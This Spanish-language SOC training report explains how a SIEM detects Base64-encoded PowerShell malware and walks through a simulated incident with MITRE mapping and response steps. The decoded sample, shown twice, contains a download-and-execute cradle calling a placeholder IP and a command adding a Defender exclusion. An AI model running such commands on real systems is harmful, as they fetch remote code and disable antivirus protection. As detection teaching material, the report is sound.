# 🧪 Reporte 20 — Detecting Base64-Encoded PowerShell Malware

## 🎯 Objetivo
Entender cómo los SIEM y los analistas SOC detectan comandos PowerShell maliciosos codificados en Base64, cómo se decodifican y cómo correlacionar esta actividad con MITRE ATT&CK para identificar malware y ataques avanzados.

---

# 🧠 1. ¿Por qué PowerShell es tan usado por atacantes?
PowerShell es extremadamente poderoso y viene integrado en Windows.  
Los atacantes lo prefieren porque:

- puede ejecutar código directamente en memoria  
- puede descargar archivos (payloads)  
- evade antivirus tradicionales  
- permite “living off the land” (LOLbins)  
- no requiere instalar nada adicional  
- puede codificar comandos en Base64 para ocultar actividad  

Por eso muchas campañas de ransomware y malware avanzado empiezan con PowerShell.

---

# 🟧 2. ¿Qué es el parámetro `-enc`?

Cuando PowerShell ejecuta algo como:

powershell.exe -nop -w hidden -enc SQBFAHgAIAAoAE4...

Significa:

- `-nop` → no mostrar mensajes (NoProfile / NoLogo / NoPrompt según el caso)  
- `-w hidden` → ventana oculta  
- `-enc` → ejecutar un script codificado en Base64  

Los atacantes usan esto para ocultar comandos maliciosos.  
Casi siempre, cuando un SIEM ve `-enc`, genera alerta.

---

# 🟥 3. ¿Cómo detecta esto un SIEM?

## ⭐ Paso 1 — Captura de logs (ScriptBlock Logging)

PowerShell genera eventos (por ejemplo, Event ID 4104) con:

- el comando ejecutado  
- el script block  
- parámetros como `-enc`  
- el contenido Base64

El SIEM recibe estos logs desde los endpoints.

---

## ⭐ Paso 2 — Regla del SIEM detecta patrones sospechosos

El SIEM busca combinaciones como:

- `-nop`  
- `-w hidden`  
- `-enc`  
- `ExecutionPolicy Bypass`  

Este patrón se asocia fuertemente a malware.

---

## ⭐ Paso 3 — Decodificación de Base64

El SIEM o el analista decodifican el contenido Base64.  
Ejemplo (simplificado):

Entrada codificada (ejemplo):

SQBFAHgAIAAoAE4...

Tras decodificar, se ve algo como:

IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/update.ps1')  
Add-MpPreference -ExclusionPath "C:\Users\Public"

---

## ⭐ Paso 4 — Análisis de comportamiento del script

El contenido decodificado revela:

- uso de `IEX` (Invoke-Expression) → ejecución de código  
- `New-Object Net.WebClient` + `DownloadString` → descarga de payload remoto  
- `Add-MpPreference -ExclusionPath` → evasión de antivirus (Windows Defender)

---

## ⭐ Paso 5 — Correlación con MITRE ATT&CK

El comportamiento se mapea a tácticas y técnicas:

- Ejecución de PowerShell → T1059.001  
- Descarga de herramientas → T1105 (Ingress Tool Transfer)  
- Deshabilitar/evadir seguridad → T1562.001 (Disable Security Tools)  

Así, el SIEM no solo ve texto, sino un patrón de ataque.

---

# 🟦 4. Caso simulado (realista)

## 📌 Evento inicial capturado

Comando observado:

powershell.exe -nop -w hidden -enc SQBFAHgAIAAoAE4...

Origen:
- Host: WIN10-USER01  
- Usuario: carlos.g  

## 📌 Contenido decodificado (resumen)

IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/update.ps1')  
Add-MpPreference -ExclusionPath "C:\Users\Public"

Interpretación:

- `IEX` ejecuta directamente el contenido descargado → ejecución de malware en memoria  
- El script viene de una IP pública no conocida  
- El script excluye rutas del antivirus → intenta evitar detección

---

# 🧠 5. Análisis (razonamiento estilo SOC/MDR)

1. Los flags `-nop -w hidden -enc` son típicos de malware en PowerShell.  
2. El uso de `DownloadString` hacia una IP pública sugiere comando y control o descarga de payload.  
3. `Add-MpPreference -ExclusionPath` indica una clara intención de desactivar o debilitar el antivirus.  
4. La ejecución está ocurriendo probablemente tras un phishing o documento malicioso (Word, Excel, etc.), aunque en este caso no se muestra el padre del proceso, se asume contexto malicioso.

### Conclusión:

> Se detectó la ejecución de PowerShell codificado en Base64, el cual descarga y ejecuta un script remoto, y modifica la configuración del antivirus para permitir la ejecución de malware. La actividad es altamente maliciosa y consistente con la fase inicial de un ataque de ransomware o carga útil avanzada.

---

# 🛡️ 6. Acciones recomendadas

1. Aislar inmediatamente la máquina WIN10-USER01 de la red.  
2. Revocar cualquier token de sesión o credencial asociada al usuario `carlos.g`.  
3. Bloquear la IP `203.0.113.77` en el firewall y en proxies de salida.  
4. Revisar si otros hosts ejecutaron comandos similares con `-enc` y patrones de descarga.  
5. Eliminar cualquier exclusión de antivirus creada (revertir `Add-MpPreference`).  
6. Ejecutar un análisis completo del endpoint con EDR/antivirus actualizado.  
7. Revisar Scheduled Tasks, claves de registro de “Run” y WMI para detectar persistencia.  
8. Documentar el incidente y, si aplica, iniciar proceso formal de respuesta a incidentes (IR).

---

# 🧭 7. Mapeo MITRE ATT&CK

| Táctica               | Técnica                                              |
|----------------------|------------------------------------------------------|
| Execution            | T1059.001 — PowerShell                               |
| Command & Control    | T1105 — Ingress Tool Transfer                        |
| Defense Evasion      | T1562.001 — Disable or Modify Security Tools         |
| Execution            | T1059 — Command and Scripting Interpreter            |
| Initial Access       | T1204 — User Execution (p.ej. documento malicioso)   |

---

# 📝 8. Resumen ejecutivo

Se detectó en el host WIN10-USER01 la ejecución de un comando PowerShell codificado en Base64 con parámetros típicos de malware (`-nop -w hidden -enc`). El contenido decodificado muestra la descarga de un script desde una IP pública y la modificación de la configuración del antivirus para excluir rutas críticas, lo que indica un intento claro de ejecución y persistencia de malware. El incidente debe ser tratado como potencial fase inicial de un ataque de ransomware o comprometimiento avanzado, requiriendo aislamiento inmediato del host, bloqueo de la IP maliciosa, análisis forense del sistema y revisión de posibles movimientos laterales o exfiltración.
